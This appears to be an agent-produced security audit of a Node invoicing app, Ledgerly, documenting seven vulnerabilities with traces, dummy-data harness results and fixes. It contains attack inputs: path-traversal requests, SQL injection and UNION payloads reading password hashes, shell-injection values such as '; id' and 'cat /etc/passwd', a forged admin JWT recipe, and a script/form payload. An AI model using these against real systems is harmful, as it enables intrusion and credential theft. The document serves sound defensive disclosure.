# Ledgerly: confirmed findings detail (medium and above)

Every reproduction listed here is a bounded local harness that uses only Node built-ins and copies source expressions verbatim. No target code was executed. The native-interface payloads show what the equivalent request against a dummy local deployment would look like. They are not instructions to probe a live system.

## C1. Path traversal in GET /api/files/attachments lets any self-registered member read files outside uploads/, including the SQLite database

**Severity:** high (likelihood high, impact high) · **Confidence:** high · **Fingerprint:** `ledgerly/files-attachments-uploadDir-traversal`

Any authenticated member can read files outside uploads/. Because registration is open, that means anyone who signs up. The attachments handler joins the query parameter `name` onto config.uploadDir with path.join and passes the result straight to res.sendFile. Nothing checks that the result stays inside uploadDir. path.join removes '..' segments before Express and send see the path, so send's '..' guard for root-less absolute paths never matches. Some files sit at fixed paths relative to uploadDir, such as src/config.js, which holds the hardcoded JWT signing secret. Under the README's `npm start` from the repository root, the default database file ledgerly.db is also reachable at ../ledgerly.db. It holds every user's password_hash and role, plus every owner's invoices and share tokens. Any absolute host path the process can read is also reachable, either by enough '../' segments or because a leading '/' in `name` is joined and normalised the same way. The one exception is a file whose last path component starts with '.': send's legacy dotfile rule returns 404 for it.

### Trace

1. **entrypoint** `src/routes/files.js:10` `GET /api/files/attachments`: Handler mounted at /api/files (src/server.js:9) behind router.use(requireAuth) (src/routes/files.js:7). Any valid member bearer token passes. Express's default query parser has already percent-decoded req.query.name.
2. **propagation** `src/config.js:5` `module.exports.uploadDir`: uploadDir = path.join(__dirname, '..', 'uploads'), i.e. <repo>/uploads, a fixed position next to src/ and, under `npm start` from the repo root, next to the default cwd-relative ledgerly.db.
3. **propagation** `src/routes/files.js:11` `attachments handler`: path.join(config.uploadDir, '../ledgerly.db') normalises to <repo>/ledgerly.db, and '../src/config.js' to <repo>/src/config.js. No prefix check follows.
4. **propagation** `src/routes/files.js:12` `attachments handler`: fs.existsSync only checks that the file exists somewhere on disk. It is not a containment check.
5. **propagation** `node_modules/send/index.js:546` `SendStream.prototype.pipe (root === null branch)`: UP_PATH_REGEXP is tested against the already-normalised absolute path and does not match. The legacy dotfile rule (lines 559-581) only ignores paths whose final component starts with '.'.
6. **sink** `src/routes/files.js:13` `attachments handler`: res.sendFile(file) streams the out-of-directory file to the requesting member.

### Evidence

- `src/routes/files.js:11`: path.join with user-controlled req.query.name and no confinement check.
- `src/routes/files.js:20`: The sibling exports route enforces a resolve-and-prefix confinement check, which shows the control is intended but missing on attachments.
- `node_modules/express/lib/response.js:446`: Express 4.22.3 sendFile calls send(req, encodeURI(path), opts) with no root when the path is absolute (lines 440-446).
- `node_modules/send/index.js:546`: send 0.19.2's root-less traversal guard runs after path.join has already removed '..' segments.
- `src/config.js:4`: dbFile defaults to the cwd-relative 'ledgerly.db', which sits beside uploads/ when the process runs from the repository root (README.md:7 `npm start`).
- `src/config.js:3`: The JWT signing secret is a string literal in src/config.js, a file reachable at the fixed relative path ../src/config.js.
- `src/routes/auth.js:5`: Open self-registration lets an anonymous client become a member and obtain a token through /login.

### Principal and resource

- **Attacker:** A self-registered member with a valid bearer token.
- **Intended behavior:** The route should only serve attachment files directly inside config.uploadDir, ideally only those attached to an invoice owned by req.user.sub. The sibling exports route (src/routes/files.js:18-20) already enforces a basename and resolved-directory prefix check.

### Bounded reproduction

Payloads (native interface):

```
GET /api/files/attachments?name=../src/config.js
```
```
GET /api/files/attachments?name=../ledgerly.db
```
```
GET /api/files/attachments?name=/../ledgerly.db
```

Instructions as performed:

1. Verifier v3-01 wrote its own harness, scratch/v01.cjs, using only Node built-ins. Its source and output are in agents/v3-01/artifacts/check-01.txt. It did not execute the target server, any file under src/, or node_modules.
2. The harness builds a dummy fixture tree: repo/src/config.js with a dummy secret, repo/uploads/a.pdf, repo/.env, and repo/ledgerly.db, a node:sqlite file with the users schema from src/lib/db.js:5 and one dummy victim row. Its handler copies these sources verbatim: the uploadDir expression (src/config.js:5); the join, existsSync and sendFile call (src/routes/files.js:11-13); the root-less path handling in Express 4.22.3 (response.js:440-446); and send 0.19.2's decode (996-1002), UP_PATH_REGEXP (63), the root===null branch of pipe (513-557), containsDotFile (924-933) and the legacy dotfile rule (559-581). A file read stands in for streaming.
3. The harness evaluates these query values as Express would deliver them, already decoded: a.pdf, ../src/config.js, ../ledgerly.db, /../ledgerly.db, ../.env, the empty string, an array, and the decoded form of ..%2Fledgerly.db.

**Observed:** Built-in harness, not a target execution. 'a.pdf' gave 200 (control). '../src/config.js' gave 200 and resolved to src/config.js; the body contained the dummy secret. '../ledgerly.db', '/../ledgerly.db' and the decoded '..%2Fledgerly.db' each gave 200, resolved to ledgerly.db (12288 bytes, header 'SQLite format 3') and contained the dummy victim password_hash. '../.env' gave 404 under the dotfile ignore rule. An empty name hit the uploads directory, which leads to EISDIR, then next(), then 404. An array value made path.join throw a TypeError, which Express turns into a 500.

### Conditions and containment

- *authentication_level*: Any valid member JWT. POST /api/auth/register and /login are open to anonymous clients.
- *system_configuration*: Reading the database at ../ledgerly.db requires the default DB_FILE and a process working directory at the repository root, which is what README's `npm start` gives. ../src/config.js and absolute host files the process can read do not depend on this. Files whose final component starts with '.' (e.g. .env) return 404.

### Remediation

Reduce the name to a basename, resolve it under uploadDir, require the uploadDir+sep prefix, and serve it with sendFile's root option and dotfiles 'deny' so send's own containment applies too. Separately, bind attachments to invoices owned by req.user.sub. Regression tests: name=../src/config.js, name=/../ledgerly.db and name=..%2Fledgerly.db must each return 400 or 404.

`src/routes/files.js`:
```js
router.get('/attachments', (req, res) => {
  if (typeof req.query.name !== 'string') return res.status(400).end();
  const name = path.basename(req.query.name);
  const root = path.resolve(config.uploadDir);
  const full = path.resolve(root, name);
  if (!name || !full.startsWith(root + path.sep)) return res.status(400).end();
  res.sendFile(name, { root, dotfiles: 'deny' }, (err) => { if (err && !res.headersSent) res.status(404).end(); });
});
```

Linked coverage units: files-attach

---

## C2. GET /api/invoices/:id lets any member read other owners' invoices

**Severity:** high (likelihood high, impact high) · **Confidence:** high · **Fingerprint:** `ledgerly/invoices/get-by-id/missing-owner-predicate`

Any authenticated member can read another owner's invoice by its integer id. The response includes the customer, amount, status, notes, created_at and share_token. The handler only checks that the caller is logged in and never checks who owns the invoice. The leaked share_token also opens the public /i/:token page for that invoice (src/routes/share.js:8), which works without authentication.

### Trace

1. **entrypoint** `src/routes/invoices.js:23` `router.get('/:id')`: GET /api/invoices/:id (mounted at src/server.js:8). An authenticated member chooses the id. '/search' is declared earlier at line 17, so it does not shadow this route.
2. **propagation** `src/lib/auth.js:20` `requireAuth`: jwt.verify checks the bearer token and sets req.user = {sub, role}. No check binds the caller to the resource.
3. **propagation** `src/routes/invoices.js:24` `router.get('/:id')`: Looks up the invoice by id only and never uses req.user.sub.
4. **sink** `src/routes/invoices.js:26` `router.get('/:id')`: res.json(inv) returns the full row from another owner, including notes and share_token.

### Evidence

- `src/routes/invoices.js:24`: The query has no owner_id predicate.
- `src/routes/invoices.js:8`: router.use(requireAuth) is the only middleware on this router. It authenticates the caller but does not authorize access to records.
- `src/routes/invoices.js:13`: The sibling list path binds owner_id = ?, which shows the intended per-owner policy.
- `src/routes/invoices.js:37`: The sibling delete path binds owner_id = ?.
- `src/lib/db.js:6`: invoices.id is an INTEGER PRIMARY KEY, so ids are sequential and can be enumerated. share_token and notes are columns in the returned row.
- `src/routes/auth.js:8`: Anonymous registration inserts a user without a role, so the role defaults to 'member' (src/lib/db.js:5). Any internet client can therefore get a valid JWT through login.
- `src/routes/share.js:8`: The public /i/:token route looks up the invoice by share_token alone, so a leaked token opens that invoice's public page without authentication.

### Principal and resource

- **Attacker:** A self-registered member (Mallory, sub 2) requests an invoice owned by another member (Alice, sub 1).
- **Intended behavior:** The read path should be bound to the authenticated owner, as the sibling list path (src/routes/invoices.js:13) and delete path (src/routes/invoices.js:37) already are. It should return 404 for invoices the caller does not own.

### Bounded reproduction

Payloads (native interface):

```
GET /api/invoices/1 with Authorization: Bearer <member JWT for sub 2>, where invoice 1 has owner_id 1
```

Instructions as performed:

1. v3-02 wrote its own Node built-in harness (node:sqlite ':memory:') that copies these source expressions word for word: the schema from src/lib/db.js:5-6, the register INSERT from src/routes/auth.js:8, the create INSERT from src/routes/invoices.js:31-32, the GET query from src/routes/invoices.js:24, the list query from src/routes/invoices.js:13 and the share lookup from src/routes/share.js:8. It used two dummy members. This is not an execution of the target.
2. Set req.user = {sub: 2, role: 'member'}, which is the claim shape sign() produces at src/lib/auth.js:15, and req.params.id = '1'. Ran the verbatim query from line 24.
3. Checked that the returned share_token resolves through the verbatim public share lookup. Also ran the proposed owner-bound fix for both callers.
4. Express routing order, requireAuth and res.json were established from source only, and the target server was not run. The harness and source together settle every step.
5. The decisive output is in check-01.txt, which will be promoted to agents/v3-02/artifacts/check-01.txt.

**Observed:** For caller sub 2, the verbatim GET query returned {"id":1,"owner_id":1,"customer":"AliceDummyCustomer","amount_cents":5000,"status":"draft","notes":"alice-private-note","share_token":"mAWDCVhmzq5LOhrGgQudI_Iqrj9oTXt2",...}. The leaked token resolved through the public share lookup to row id 1. The owner-bound sibling list returned only [2] to the same caller. With the proposed fix, the cross-owner request returned undefined (404) and the real owner still got id 1.

### Conditions and containment

- *authentication_level*: The attacker needs any valid member JWT. Anonymous self-registration (src/routes/auth.js:7-11) followed by login (src/routes/auth.js:13-17) provides one.
- *data_state*: Another owner's invoice must exist. Ids are sequential integers, so they can be enumerated.

### Remediation

Bind the lookup to the authenticated owner and return 404 when no row matches. Add a two-owner regression test that checks owner B gets 404 for owner A's id. Consider rotating share tokens if this endpoint may already have been abused.

`src/routes/invoices.js`:
```js
router.get('/:id', (req, res) => {
  const inv = db.prepare('SELECT * FROM invoices WHERE id = ? AND owner_id = ?').get(Number(req.params.id), req.user.sub);
  if (!inv) return res.status(404).json({ error: 'not found' });
  res.json(inv);
});
```

Linked coverage units: inv-get

---

## C3. SQL injection in GET /api/invoices/search exposes all invoices and user password hashes

**Severity:** high (likelihood high, impact high) · **Confidence:** high · **Fingerprint:** `ledgerly/invoices/search/sql-template-interpolation`

The search parameter q is interpolated directly into the SQL string with no bound parameters. Any authenticated member can break out of the LIKE literal to defeat the owner_id predicate, or use UNION SELECT to read other tables including users.email, users.role and users.password_hash. Stacked write statements are not executed by node:sqlite's single-statement .all(), so the demonstrated impact is reading the whole database (cross-tenant read), not writes.

### Trace

1. **entrypoint** `src/routes/invoices.js:17` `router.get('/search')`: Authenticated GET /api/invoices/search?q=<attacker string>; router.use(requireAuth) at line 8 gates with a member JWT only.
2. **propagation** `src/routes/invoices.js:18` `router.get('/search')`: q = req.query.q || '' with no validation, escaping, or type coercion.
3. **sink** `src/routes/invoices.js:19` `router.get('/search')`: q is interpolated inside '%...%' and req.user.sub inside owner_id = in the SQL text passed to db.prepare(...).all(), and rows are returned via res.json at line 20.

### Evidence

- `src/routes/invoices.js:19`: Template-literal SQL: SELECT * FROM invoices WHERE owner_id = ${req.user.sub} AND customer LIKE '%${q}%', run via .all() with no bound parameters.
- `src/routes/invoices.js:13`: The sibling list query binds owner_id with ? (.all(req.user.sub)), showing the intended parameterized pattern that /search omits.
- `src/lib/db.js:5`: The users table holds email, role and password_hash in the same SQLite database, so a UNION SELECT from invoices can reach it.

### Principal and resource

- **Attacker:** Authenticated member (JWT sub=20) owning only their own invoice, searching other owners' data.
- **Intended behavior:** q should be passed as a bound LIKE parameter (with %, _ and \ escaped) and owner_id bound as a parameter, so search results are always limited to the caller's own invoices, matching the sibling list query at line 13 which binds owner_id with ?.

### Bounded reproduction

Payloads (native interface):

```
q=' OR 1=1 --
```
```
q=' UNION SELECT id,id,email,0,role,password_hash,'t','c' FROM users --
```
```
q='; DELETE FROM invoices; --
```

Instructions as performed:

1. Self-authored built-in Node harness (node:sqlite ':memory:'); NOT an execution of the target. Copies src/lib/db.js:5-6 schema and the src/routes/invoices.js:18-19 expressions verbatim, with dummy users 10 (admin) and 20 (member) and one invoice each.
2. Ran the verbatim search expression with user.sub=20 for a benign LIKE, the OR-true bypass, the UNION-over-users payload, and a stacked DELETE.
3. Express query parsing and res.json are established from source only; the target server was not run. Harness plus source settle every step. See agents/v3-10/artifacts/check-01.txt.

**Observed:** Benign q=Co returned only caller 20's own invoice. q=' OR 1=1 -- returned BOTH owner 10's and owner 20's invoices (including owner 10's share_token VICTIMTOKEN), defeating the owner_id predicate. The UNION payload returned rows containing victim@dummy.test, role admin, and password_hash DUMMYSALT:DUMMYHASH from the users table. The stacked DELETE was ignored by node:sqlite .all() (invoice count stayed 2), confirming the impact is read-only.

### Conditions and containment

- *authentication_level*: Any valid member JWT. Registration (src/routes/auth.js:5-9) is anonymous and grants the default member role, so the attacker is a peer-owned auth unit, not a privileged one.

### Remediation

Parameterize both values and escape LIKE wildcards; bind owner_id so the predicate cannot be defeated. Add regression tests confirming that q containing a quote returns only the caller's rows and that UNION payloads return no foreign rows.

`src/routes/invoices.js`:
```js
router.get('/search', (req, res) => {
  const q = String(req.query.q || '').replace(/[\\%_]/g, (c) => '\\' + c);
  const rows = db.prepare("SELECT * FROM invoices WHERE owner_id = ? AND customer LIKE ? ESCAPE '\\'").all(req.user.sub, `%${q}%`);
  res.json(rows);
});
```

Linked coverage units: inv-search

---

## C4. OS command injection in admin POST /api/tools/diagnostics/ping

**Severity:** high (likelihood low, impact critical) · **Confidence:** high · **Fingerprint:** `ledgerly/tools-ping-exec-shell-interpolation`

The admin ping diagnostic inserts req.body.host into a command string. child_process.exec then runs that string through /bin/sh -c. Anyone holding a token whose role claim is 'admin' can run arbitrary shell commands as the server process and get stdout back in the JSON response. The intended feature is narrower: one reachability check against the mail relay host.

### Trace

1. **entrypoint** `src/routes/tools.js:21` `POST /api/tools/diagnostics/ping`: The route is mounted at /api/tools (server.js:10). It runs after router-level requireAuth (tools.js:6) and route-level requireAdmin. The body is parsed by express.json with a 100kb limit (server.js:5), so host is caller-controlled JSON.
2. **propagation** `src/lib/auth.js:27` `requireAdmin`: The only check is req.user.role !== 'admin' against the verified HS256 JWT claim. Nothing on the path validates, type-checks, or escapes req.body.host.
3. **sink** `src/routes/tools.js:22` `ping handler`: exec() receives the interpolated template string and runs it with options.shell=true (/bin/sh -c on POSIX). The resulting stdout is returned to the caller as res.json({ ok, out }).

### Evidence

- `src/routes/tools.js:22`: exec is called with a template literal containing raw req.body.host, and its stdout is returned in the response.
- `src/routes/tools.js:30`: The sibling git diagnostic uses execFile with a fixed allowlisted argv (tools.js:26-29), which is the safer pattern the ping route does not follow.
- `src/lib/auth.js:27`: The admin role check on the JWT claim is the only control before the sink.
- `src/routes/tools.js:6`: Router-level requireAuth means a valid bearer token is required for the route.

### Principal and resource

- **Attacker:** A holder of an admin bearer token who sends a crafted JSON body.
- **Intended behavior:** Admins should only be able to send one ICMP echo to a validated hostname or IP literal. The host must reach ping as a single argv element through execFile without a shell, and must never be read as shell syntax.

### Bounded reproduction

Payloads (native interface):

```
POST /api/tools/diagnostics/ping {"host":"127.0.0.1; id"}
```

Instructions as performed:

1. Verifier v3-06 ran a self-authored harness using only Node built-ins (agents/v3-06/artifacts/check-01.txt). It did NOT run the target and spawned no process.
2. The harness replaces child_process.execFile with an in-memory recorder and replaces spawn with a function that throws. It then calls the real Node v22.23.4 child_process.exec with the expression copied verbatim from src/routes/tools.js:22, once per dummy host value. This shows exactly what exec forwards for execution.
3. It also prints, read-only, the shell branch of Node's normalizeSpawnArguments. That branch maps shell=true to file '/bin/sh' with args ['-c', command] on non-Windows platforms.

**Observed:** For host '127.0.0.1; id', the real exec() forwarded file 'ping -c 1 127.0.0.1; id' with options.shell=true and timeout=5000. '$(id)', backtick 'id' and '127.0.0.1 && cat /etc/passwd' were also forwarded unchanged with shell=true. Node's normalizeSpawnArguments source shows that shell=true becomes /bin/sh -c <command> on POSIX. No shell command was run. The final step, where /bin/sh treats ';', '&&', '$()' and backticks as command separators or substitution, is fixed POSIX shell semantics.

### Conditions and containment

- *authorization_role*: Requires a valid HS256 JWT whose role claim is 'admin'. This record does not claim how a non-admin could get that role (for example the literal jwtSecret at src/config.js:3, or 'role' in the PATCH /api/users/me allowlist at src/routes/users.js:12). Those paths belong to peer units.

### Remediation

Require host to be a string matching a strict hostname or IP-literal pattern that cannot start with '-'. Call execFile('ping', ['-c', '1', host]) with no shell. Regression test: host '127.0.0.1; id' and a non-string host must both return 400 and spawn nothing.

`src/routes/tools.js`:
```js
const HOST_RE = /^(?!-)[A-Za-z0-9.:-]{1,253}$/;
router.post('/diagnostics/ping', requireAdmin, (req, res) => {
  const host = req.body && req.body.host;
  if (typeof host !== 'string' || !HOST_RE.test(host)) return res.status(400).json({ error: 'invalid host' });
  execFile('ping', ['-c', '1', host], { timeout: 5000 }, (err, out) => res.json({ ok: !err, out }));
});
```

Linked coverage units: tools-ping

---

## C5. Hardcoded JWT HS256 signing key allows forging tokens for any user or role

**Severity:** high (likelihood medium, impact high) · **Confidence:** high · **Fingerprint:** `src/config.js:jwtSecret:hardcoded-hs256-signing-key`

The key that signs and verifies JWTs is the string literal 'ledgerly-dev-secret-2024' in src/config.js:3. Nothing in the source lets the environment override it. Anyone who knows the repository source can sign an HS256 token with any sub and role:'admin'. requireAuth accepts that token, so the attacker can act as any user id on every route behind requireAuth and pass requireAdmin. requireAuth sets no maxAge, so a forged token without exp is accepted until the key changes.

### Trace

1. **entrypoint** `src/lib/auth.js:18` `requireAuth`: requireAuth takes the token from any client's Authorization header after removing the 'Bearer ' prefix. The middleware is mounted on the invoices, files and tools routers and on GET/PATCH /api/users/me.
2. **propagation** `src/config.js:3` `module.exports.jwtSecret`: The verification key is the committed literal 'ledgerly-dev-secret-2024'. port and dbFile read process.env, but jwtSecret has no override.
3. **propagation** `src/lib/auth.js:20` `requireAuth`: jwt.verify(t, config.jwtSecret, { algorithms: ['HS256'] }) runs with no aud, iss or maxAge. In jsonwebtoken 9.0.3, a token signed with the literal passes the algorithm allowlist (verify.js:144) and the HMAC check (verify.js:165 to jws to jwa). exp is checked only if present (verify.js:185). The payload becomes req.user.
4. **sink** `src/lib/auth.js:27` `requireAdmin`: The forged role:'admin' claim passes requireAdmin, which guards /api/tools/diagnostics/*. Routes that use req.user.sub as the identity (for example src/routes/users.js:6,15 and src/routes/invoices.js:13,32,37) act on the forged sub.

### Evidence

- `src/config.js:3`: jwtSecret: 'ledgerly-dev-secret-2024'. The value is a literal with no process.env fallback.
- `src/lib/auth.js:15`: sign() uses the same config.jwtSecret, so forged tokens cannot be told apart from legitimate ones.
- `src/lib/auth.js:20`: verify uses config.jwtSecret with algorithms ['HS256'] only. No audience, issuer or maxAge is set.
- `node_modules/jsonwebtoken/verify.js:144`: The algorithm allowlist rejects 'none' and non-HS256 algorithms, but it does not stop an attacker who holds the HS256 key.
- `node_modules/jsonwebtoken/verify.js:185`: exp is enforced only when the payload contains it. The aud, iss and maxAge checks at lines 194, 209 and 237 run only when the caller configures them, and requireAuth does not.
- `node_modules/jwa/index.js:152`: The HMAC verifier recomputes HMAC-SHA256 over header.payload with the supplied secret and compares in constant time. The check is deterministic, so a token signed with the known literal verifies.
- `package-lock.json:460`: The lockfile resolves jsonwebtoken 9.0.3 (the installed package.json also reports 9.0.3), with jwa 2.0.1 and jws 4.0.1.

### Principal and resource

- **Attacker:** An unauthenticated client who knows the committed secret literal.
- **Intended behavior:** The deployment should supply a high-entropy HS256 key (environment or secret store), and the server should refuse to start without it. requireAuth should require exp (or maxAge), aud and iss, and sign() should issue them.

### Bounded reproduction

Payloads (native interface):

```
Authorization: Bearer <HS256 JWT signed with 'ledgerly-dev-secret-2024' over {"sub":1,"role":"admin"}, header {"alg":"HS256","typ":"JWT"}, no exp>
```
```
node agents/hunter-auth/scratch/h02.cjs
```

Instructions as performed:

1. The decisive observed result is the promoted hunter artifact agents/hunter-auth/artifacts/check-02.txt. Its built-in Node harness (crypto, fs, path only) forges the token with the verbatim literal from src/config.js:3 and applies the verbatim header parsing from src/lib/auth.js:18. It verifies with a re-implementation of the jsonwebtoken 9.0.3 HS256 steps (allowlist, HMAC-SHA256 compare, exp only if present) and evaluates the requireAdmin predicate from src/lib/auth.js:27. Neither the target nor jsonwebtoken was executed.
2. Verifier v3-08 could not run a harness because shell execution was denied in this session, so it produced no check-NN.txt files. Instead it re-read the full library path: verify.js:59-185 and 194-261, decode.js, jws/lib/verify-stream.js:44-55 and jwa/index.js:89-93 and 127-157. That path confirms the modeled steps match the real ones for this call shape: string secret to createSecretKey, typ JWT payload parsed to an object, HMAC over the first two segments, base64url without padding, and the length-checked timingSafeEqual. HMAC-SHA256 is deterministic, so source plus the harness settle every step.
3. Negative controls in check-02 show the check rejects a token signed with a different secret ('invalid signature') and an alg none token ('invalid algorithm').

**Observed:** In the built-in harness model (not an execution of the target), verification with config.jwtSecret returned {"payload":{"sub":1,"role":"admin"}} and the requireAdmin predicate returned true. The wrong-secret control returned 'invalid signature' and the alg none control returned 'invalid algorithm'.

### Conditions and containment

- *environmental_dependency*: The attacker knows the committed literal, for example through source access, a leak, a former contributor or a fork. package.json sets private:true, so public availability of the repository is not established.
- *system_configuration*: The deployed build is this source with src/config.js unmodified. The source offers no environment override for the key.
- *authentication_level*: None. No account is needed to forge a token.

### Remediation

Load the HS256 key from the deployment environment or a secret store, and fail closed at startup if it is missing or shorter than 32 bytes. Rotate the key, since the committed value must be treated as public. Issue and require aud and iss in both sign() and requireAuth, and enforce token age with maxAge (sign() already adds iat and exp). Regression tests: a token signed with 'ledgerly-dev-secret-2024' is rejected; a token without iat/exp or with the wrong aud or iss is rejected; a freshly issued login token is accepted.

`src/config.js`:
```js
jwtSecret: (() => { const s = process.env.JWT_SECRET; if (!s || s.length < 32) throw new Error('JWT_SECRET must be set (>=32 chars)'); return s; })(),
```

`src/lib/auth.js`:
```js
function sign(user) {
  return jwt.sign({ sub: user.id, role: user.role }, config.jwtSecret, { expiresIn: '8h', algorithm: 'HS256', audience: 'ledgerly-api', issuer: 'ledgerly' });
}
function requireAuth(req, res, next) {
  const t = (req.headers.authorization || '').replace(/^Bearer /, '');
  try {
    req.user = jwt.verify(t, config.jwtSecret, { algorithms: ['HS256'], maxAge: '8h', audience: 'ledgerly-api', issuer: 'ledgerly' });
    next();
  } catch {
    res.status(401).json({ error: 'unauthorized' });
  }
}
```

Linked coverage units: auth-jwt

---

## C6. Any member can make themselves admin via PATCH /api/users/me

**Severity:** high (likelihood high, impact high) · **Confidence:** high · **Fingerprint:** `src/routes/users.js:PATCH-me:role-mass-assignment`

The PATCH /api/users/me field allowlist includes 'role', so any authenticated member can set their own users.role to 'admin'. Anyone on the internet can register an account. At the next login, the JWT role claim is taken from the updated row. requireAdmin then passes, and the caller can use the admin-only routes /api/tools/diagnostics/ping and /api/tools/diagnostics/git.

### Trace

1. **entrypoint** `src/routes/auth.js:8` `POST /api/auth/register`: An anonymous caller creates an account. The INSERT has no role column, so role takes the schema default 'member' (src/lib/db.js:5).
2. **propagation** `src/routes/users.js:12` `PATCH /api/users/me`: Request body keys are filtered against ['name','company','email','role'], so 'role' is accepted. The route is behind requireAuth only (line 11).
3. **propagation** `src/routes/users.js:15` `PATCH /api/users/me`: UPDATE users SET role = ? WHERE id = ? binds req.body.role and req.user.sub. The caller's own row now holds the role the attacker chose.
4. **propagation** `src/lib/auth.js:15` `sign`: The login route (src/routes/auth.js:13-15) selects the row and signs {sub: user.id, role: user.role}, so the new token carries role 'admin'.
5. **sink** `src/lib/auth.js:27` `requireAdmin`: The gate checks only req.user.role !== 'admin'. With the escalated token it calls next() for /api/tools/diagnostics/ping (src/routes/tools.js:21) and /api/tools/diagnostics/git (src/routes/tools.js:27).

### Evidence

- `src/routes/users.js:12`: The allowlist literal ['name', 'company', 'email', 'role'] contains 'role'.
- `src/routes/users.js:15`: The dynamic UPDATE binds req.body[f] for every allowlisted field on the caller's own row. No role or privilege check exists anywhere in the handler.
- `src/lib/db.js:5`: users.role defaults to 'member'. Registration (src/routes/auth.js:8) does not set it.
- `src/lib/auth.js:15`: The token role claim is copied from users.role at login.
- `src/lib/auth.js:27`: The admin gate compares only the role claim in the token.
- `src/routes/tools.js:21`: The admin-only diagnostics/ping route is guarded by requireAdmin alone, so it is reachable after escalation.

### Principal and resource

- **Attacker:** A self-registered member holding their own bearer token.
- **Intended behavior:** Members may edit only their own non-privileged profile fields (name, company, email). Self-service must never be able to change a role. Role changes should go through a separate admin-only, audited path.

### Bounded reproduction

Payloads (native interface):

```
POST /api/auth/register  body: {"email":"dummy-member@example.test","password":"dummy-password-123"}
```
```
PATCH /api/users/me  Authorization: Bearer <member token>  body: {"role":"admin"}
```
```
POST /api/auth/login  body: {"email":"dummy-member@example.test","password":"dummy-password-123"}
```

Instructions as performed:

1. Evidence is the parent-promoted harness artifact agents/hunter-auth/artifacts/check-01.txt. It is a self-authored built-in Node harness (node:sqlite ':memory:', crypto, dummy data, no network), not an execution of the target. Verifier v3-09 compared every reproduced expression line by line against source: the users schema (src/lib/db.js:5), hashPassword/checkPassword (src/lib/auth.js:5-13), the register INSERT (src/routes/auth.js:8), the login lookup (src/routes/auth.js:13-14), the PATCH /me filter, UPDATE and response SELECT (src/routes/users.js:12-16), the sign payload shape (src/lib/auth.js:15) and the requireAdmin predicate (src/lib/auth.js:27). All match verbatim.
2. Verifier v3-09 produced no check-NN.txt files of its own. The Bash tool was denied in this verifier session, so no harness could be re-run. Independent reproduction is therefore limited to source review against the promoted hunter artifact.
3. Harness sequence: register a dummy member, log in, apply PATCH body {"role":"admin"}, log in again, and evaluate the requireAdmin predicate on each token payload.
4. jwt.sign/jwt.verify are not run by the harness. The source passes the payload object straight to jwt.sign, and requireAuth assigns the verified payload to req.user (src/lib/auth.js:20). express.json (src/server.js:5) gives req.body as a plain object for this JSON body.

**Observed:** In agents/hunter-auth/artifacts/check-01.txt: login #1 gave token payload {"sub":1,"role":"member"} and requireAdmin returned false. The PATCH /me response showed role "admin". Login #2 gave token payload {"sub":1,"role":"admin"} and requireAdmin returned true.

### Conditions and containment

- *authentication_level*: The attacker needs any authenticated member account. POST /api/auth/register is open to anonymous clients (src/server.js:6, src/routes/auth.js:5-10), so an anonymous internet client can meet this condition.
- *user_interaction*: No victim interaction is needed. The attacker logs in again after the PATCH to get a token with the admin claim. The token they already hold still says 'member' until it is reissued.

### Remediation

Remove 'role' from the self-service allowlist. If role management is needed, add a separate endpoint guarded by requireAuth and requireAdmin, and audit its changes. Regression test: a member sends PATCH /me {"role":"admin"}. It must return 400 ('nothing to update') and users.role must stay 'member'. A mixed body such as {"name":"x","role":"admin"} must not change role.

`src/routes/users.js`:
```js
const fields = Object.keys(req.body).filter((k) => ['name', 'company', 'email'].includes(k));
```

Linked coverage units: users-me

---

## C7. Stored HTML injection via invoice notes on the public /i/:token page

**Severity:** medium (likelihood medium, impact medium) · **Confidence:** high · **Fingerprint:** `ledgerly/share/notes-unescaped-html`

Any authenticated member can create an invoice whose notes field holds arbitrary HTML, including script and form elements. The public, unauthenticated page GET /i/:token puts inv.notes into the response without encoding. It sends that response with res.send(string), which Express 4 serves as text/html. Customer is escaped with esc() but notes is not. Nothing in the repository sets a Content-Security-Policy or any other response header. Anyone who opens the share link (the invoice recipient, or an admin or other user the member sends it to) therefore gets attacker-controlled markup served from the Ledgerly origin. The source and a built-in harness show that the markup reaches the response unencoded. Script execution in a browser was not observed: no browser or target server was run. Also, no session material on this origin can be seen in the source. Authentication uses a bearer header, there are no cookies, and the repository contains no frontend.

### Trace

1. **entrypoint** `src/routes/invoices.js:29` `router.post('/')`: An authenticated member (requireAuth at line 8, the default role at registration) POSTs /api/invoices with a JSON body that includes notes.
2. **propagation** `src/routes/invoices.js:32` `router.post('/')`: String(notes || '') is stored verbatim along with a random share_token. The member can read the token back from the owner-scoped list (SELECT * at line 13).
3. **propagation** `src/routes/share.js:8` `router.get('/i/:token')`: The unauthenticated public route, mounted at '/' in src/server.js:11, loads the invoice row by share_token.
4. **sink** `src/routes/share.js:13` `router.get('/i/:token')`: Raw inv.notes is written into the HTML body. res.send with a string body is given Content-Type text/html (express lib/response.js:147-150).

### Evidence

- `src/routes/share.js:4`: The esc() HTML-encoding helper exists.
- `src/routes/share.js:11`: esc() is applied only to customer.
- `src/routes/share.js:13`: notes is emitted without encoding inside div.notes.
- `src/routes/invoices.js:32`: notes is stored as String(notes) without sanitization.
- `src/routes/invoices.js:13`: The owner-scoped list returns SELECT *, including share_token, so the member gets the public link for its own invoice.
- `src/server.js:11`: The share router is mounted publicly at '/'. No header or CSP middleware is registered in server.js.
- `node_modules/express/lib/response.js:147`: For a string body with no Content-Type set, res.send calls this.type('html'), so the response is text/html. This was read only, not executed. Installed express version is 4.22.3.

### Principal and resource

- **Attacker:** Authenticated self-registered member who sends the public invoice link to a recipient.
- **Intended behavior:** Every stored invoice field written into the public HTML page should be HTML-encoded, as customer is, so the notes text displays as text and is never parsed as markup.

### Bounded reproduction

Payloads (native interface):

```
{"customer":"<b>DUMMY-CUST</b>","amount_cents":1234,"notes":"<script>document.title=\"DUMMY-MARKER\"</script><form action=\"https://dummy.invalid/x\"><input name=p></form>"}
```

Instructions as performed:

1. POST /api/invoices with Authorization: Bearer <member JWT> and the JSON payload.
2. GET /api/invoices with the same token and read share_token for the new invoice.
3. Unauthenticated: GET /i/<share_token> and inspect the text/html body.
4. Local reproduction (v3-04): built-in Node harness h1.cjs (node:sqlite :memory:, crypto). It copies verbatim src/lib/db.js:6, src/routes/invoices.js:30-32, and src/routes/share.js:4, 8, 10-14. It is not an execution of the target, and no browser or server was run. Decisive output is in check-01.txt, promoted as agents/v3-04/artifacts/check-01.txt.

